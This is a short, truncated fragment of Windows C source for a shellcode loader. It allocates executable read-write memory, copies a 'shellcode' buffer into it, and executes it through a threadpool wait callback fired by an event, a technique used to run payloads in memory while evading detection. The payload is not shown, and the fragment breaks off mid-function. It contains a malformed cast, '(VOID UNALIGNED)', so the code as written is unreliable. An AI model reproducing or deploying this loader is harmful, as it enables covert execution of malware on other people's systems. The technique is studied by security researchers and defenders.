...
int main(void){
		HANDLE Cev = CreateEventA(0, FALSE, TRUE, 0);
		
		if(Cev != INVALID_HANDLE_VALUE){
			
				LPVOID RemoteBuff = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				
				if(RemoteBuff != NULL){
						RtlMoveMemory((VOID UNALIGNED)RemoteBuff, shellcode, dwSize);
						
						PIP_WAIT Cpool =  CreateThreadpoolWait(RemoteBuff, 0, 0);
						if(Cpool != NULL){
								SetThreadpoolWait(Cpool, Cev, 0);
								SetEvent(Cev);
